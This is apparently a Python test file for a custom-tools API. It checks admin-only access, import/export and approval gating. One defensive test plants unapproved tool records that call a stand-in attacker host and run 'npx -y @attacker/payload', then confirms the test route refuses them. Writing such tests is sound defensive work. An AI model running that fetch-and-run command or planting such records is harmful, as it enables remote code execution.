"""Custom Tools API route extraction regressions."""

from __future__ import annotations

from pathlib import Path
from typing import Any

from nymeria.api.routers import custom_tools as custom_tools_router
from nymeria.core.accounts import AccountsRepo
from nymeria.core.chat_bindings import ChatBindingsRepo
from nymeria.core.time_utils import utc_now


class FakeCustomToolLoader:
    def __init__(self):
        self.definitions = {}
        self.lookup_ids = []

    def get_all_definitions(self):
        return list(self.definitions.values())

    def get_definition(self, tool_id: str):
        self.lookup_ids.append(tool_id)
        return self.definitions.get(tool_id)

    def save_definition(self, definition):
        definition.updated_at = utc_now()
        self.definitions[definition.id] = definition
        return Path(f"/tmp/{definition.id}.json")

    def delete_definition(self, tool_id: str) -> bool:
        return self.definitions.pop(tool_id, None) is not None


class FakeAgent:
    def __init__(self, data_dir: Path):
        accounts_db = data_dir / "accounts.db"
        self.accounts_repo = AccountsRepo(accounts_db)
        self.chat_bindings_repo = ChatBindingsRepo(accounts_db)
        self.reload_count = 0
        self.synced_tools = 0

    def reload_tools(self):
        self.reload_count += 1

    def sync_agent_tools(self):
        self.synced_tools += 1


def _authenticated_client(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
    *,
    loader: FakeCustomToolLoader,
    role: str = "admin",
) -> tuple[Any, FakeAgent, str]:
    monkeypatch.setattr(custom_tools_router, "get_custom_tool_loader", lambda: loader)
    settings = api_client_builder.settings(tmp_path)
    agent = FakeAgent(tmp_path)
    client = api_client_builder.client(agent, settings)
    agent.accounts_repo.create_user(
        "caller",
        "caller@example.com",
        "Caller",
        role=role,
    )
    token = agent.accounts_repo.issue_token("caller")
    return client, agent, token


def test_custom_tool_export_route_is_not_shadowed_by_tool_id(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    loader = FakeCustomToolLoader()
    client, _agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )

    response = client.get(
        "/tools/custom/export",
        headers=api_client_builder.auth(token),
    )

    assert response.status_code == 200
    assert response.json()["total"] == 0
    assert "export" not in loader.lookup_ids


def test_custom_tools_are_admin_only(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    loader = FakeCustomToolLoader()
    client, _agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
        role="user",
    )

    response = client.get(
        "/tools/custom",
        headers=api_client_builder.auth(token),
    )

    assert response.status_code == 403


def test_custom_tool_crud_reloads_agent_and_preserves_response_shape(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    loader = FakeCustomToolLoader()
    client, agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    create_response = client.post(
        "/tools/custom",
        headers=headers,
        json={
            "id": "price_lookup",
            "name": "Price Lookup",
            "description": "Look up a price",
            "implementation_type": "http",
            "parameters": {
                "symbol": {
                    "type": "string",
                    "description": "Ticker symbol",
                    "required": True,
                }
            },
            "http_config": {
                "method": "GET",
                "url": "https://api.example.com/prices/${symbol}",
                "headers": {"X-Test": "1"},
                "response_format": "json",
            },
            "enabled": True,
            "tags": ["finance"],
        },
    )

    assert create_response.status_code == 200
    created = create_response.json()
    assert created["id"] == "price_lookup"
    assert created["parameters"]["symbol"]["required"] is True
    assert created["http_config"]["url"] == "https://api.example.com/prices/${symbol}"
    assert created["mcp_config"] is None
    assert agent.reload_count == 1

    update_response = client.put(
        "/tools/custom/price_lookup",
        headers=headers,
        json={"description": "Look up a public market price", "enabled": False},
    )

    assert update_response.status_code == 200
    updated = update_response.json()
    assert updated["description"] == "Look up a public market price"
    assert updated["enabled"] is False
    assert agent.reload_count == 2

    delete_response = client.delete("/tools/custom/price_lookup", headers=headers)

    assert delete_response.status_code == 200
    assert delete_response.json() == {"status": "ok", "deleted_id": "price_lookup"}
    assert agent.reload_count == 3


def test_custom_tool_crud_supports_python_config(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    loader = FakeCustomToolLoader()
    client, agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    create_response = client.post(
        "/tools/custom",
        headers=headers,
        json={
            "id": "python_echo",
            "name": "Python Echo",
            "description": "Echo text through Python",
            "implementation_type": "python",
            "parameters": {
                "value": {
                    "type": "string",
                    "description": "Value to echo",
                    "required": True,
                }
            },
            "python_config": {
                "source_code": "def run(value: str) -> str:\n    return value\n",
                "entrypoint": "run",
            },
            "enabled": True,
            "tags": ["python"],
        },
    )

    assert create_response.status_code == 200
    created = create_response.json()
    assert created["implementation_type"] == "python"
    assert created["python_config"]["entrypoint"] == "run"
    assert created["http_config"] is None
    assert created["mcp_config"] is None
    assert agent.reload_count == 1


def test_custom_tool_import_export_round_trip_for_mcp_config(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    loader = FakeCustomToolLoader()
    client, agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    import_response = client.post(
        "/tools/custom/import",
        headers=headers,
        json={
            "tools": [
                {
                    "id": "read_file_mcp",
                    "name": "Read File MCP",
                    "description": "Read a file through MCP",
                    "parameters": {},
                    "implementation_type": "mcp",
                    "mcp_config": {
                        "server_command": "npx",
                        "server_args": ["-y", "@modelcontextprotocol/server-filesystem"],
                        "tool_name": "read_file",
                        "env_vars": {"MODE": "test"},
                        "working_directory": "/tmp",
                    },
                    "enabled": True,
                    "tags": ["mcp"],
                }
            ]
        },
    )

    assert import_response.status_code == 200
    assert import_response.json() == {"status": "ok", "imported": 1, "errors": []}
    assert agent.reload_count == 1

    export_response = client.get("/tools/custom/export", headers=headers)

    assert export_response.status_code == 200
    exported = export_response.json()
    assert exported["total"] == 1
    tool = exported["tools"][0]
    assert tool["id"] == "read_file_mcp"
    assert tool["implementation_type"] == "mcp"
    assert tool["mcp_config"]["server_command"] == "npx"
    assert tool["mcp_config"]["tool_name"] == "read_file"


def test_custom_tool_import_stamps_python_approval(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    # An imported python tool with no approval fields must be self-approved by
    # the importing admin so it passes the execution gate; otherwise import
    # reports success but the tool silently fails closed.
    from nymeria.core.python_custom_tools import python_execution_gate

    loader = FakeCustomToolLoader()
    client, agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    import_response = client.post(
        "/tools/custom/import",
        headers=headers,
        json={
            "tools": [
                {
                    "id": "imported_python",
                    "name": "Imported Python",
                    "description": "Planted via import without approval",
                    "parameters": {
                        "value": {"type": "string", "description": "v", "required": True}
                    },
                    "implementation_type": "python",
                    "python_config": {
                        "source_code": "def run(value: str) -> str:\n    return value\n",
                        "entrypoint": "run",
                    },
                    "enabled": True,
                    "tags": ["python"],
                }
            ]
        },
    )

    assert import_response.status_code == 200
    assert import_response.json()["imported"] == 1
    saved = loader.definitions["imported_python"]
    assert saved.python_config is not None
    assert saved.python_config.approved_by is not None
    assert python_execution_gate(saved.python_config, saved.parameters) is None


def test_custom_tool_import_stamps_http_and_mcp_approval(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    # Same trap as the python case above: an imported http/mcp tool with no
    # approval reports success and then silently fails its execution gate. The
    # importing admin is the approver, and any `approved_by` in the payload is
    # a client claim rather than a fact, so the stamp overwrites it.
    from nymeria.core.custom_tool_gate import custom_tool_execution_gate

    loader = FakeCustomToolLoader()
    client, _agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    import_response = client.post(
        "/tools/custom/import",
        headers=headers,
        json={
            "tools": [
                {
                    "id": "imported_http",
                    "name": "Imported HTTP",
                    "description": "Imported without approval",
                    "parameters": {},
                    "implementation_type": "http",
                    "http_config": {"method": "GET", "url": "https://api.example.test/v1"},
                    "approved_by": "a-name-the-payload-chose",
                },
                {
                    "id": "imported_mcp",
                    "name": "Imported MCP",
                    "description": "Imported without approval",
                    "parameters": {},
                    "implementation_type": "mcp",
                    "mcp_config": {
                        "server_command": "npx",
                        "server_args": ["-y", "@example/demo"],
                        "tool_name": "do_thing",
                    },
                },
            ]
        },
    )

    assert import_response.status_code == 200
    assert import_response.json()["imported"] == 2
    for tool_id in ("imported_http", "imported_mcp"):
        saved = loader.definitions[tool_id]
        assert custom_tool_execution_gate(saved) is None
        assert saved.approved_by == "caller"


def test_custom_tool_test_route_refuses_an_unapproved_record(
    tmp_path: Path,
    api_client_builder,
    monkeypatch,
):
    # The test route reaches execute_http_tool / mcp_manager.call_tool /
    # execute_python_tool directly off the STORED definition, bypassing the
    # StructuredTool wrappers where the gates live. Without a check here a
    # record planted in data/custom_tools/ is one admin "Test" click from a
    # subprocess spawn, and it is listed in the admin tools UI, which is what
    # invites the click.
    from nymeria.tools.definitions.custom_tool_schema import (
        CustomToolDefinition,
        HTTPToolConfig,
        PythonToolConfig,
    )
    from nymeria.tools.definitions.mcp_schema import MCPToolConfig

    loader = FakeCustomToolLoader()
    planted = {
        "planted_http": CustomToolDefinition(
            id="planted_http",
            name="Planted",
            description="never came through an authoring path",
            implementation_type="http",
            http_config=HTTPToolConfig(method="GET", url="https://attacker.example.test/x"),
        ),
        "planted_mcp": CustomToolDefinition(
            id="planted_mcp",
            name="Planted",
            description="never came through an authoring path",
            implementation_type="mcp",
            mcp_config=MCPToolConfig(
                server_command="npx",
                server_args=["-y", "@attacker/payload"],
                tool_name="do_thing",
            ),
        ),
        "planted_python": CustomToolDefinition(
            id="planted_python",
            name="Planted",
            description="never came through an authoring path",
            implementation_type="python",
            python_config=PythonToolConfig(source_code="def run():\n    return 1\n"),
        ),
    }
    loader.definitions.update(planted)

    client, _agent, token = _authenticated_client(
        tmp_path,
        api_client_builder,
        monkeypatch,
        loader=loader,
    )
    headers = api_client_builder.auth(token)

    for tool_id in planted:
        response = client.post(
            f"/tools/custom/{tool_id}/test",
            headers=headers,
            json={"params": {}},
        )
        assert response.status_code == 409, tool_id
        assert "approval_required" in response.json()["detail"], tool_id
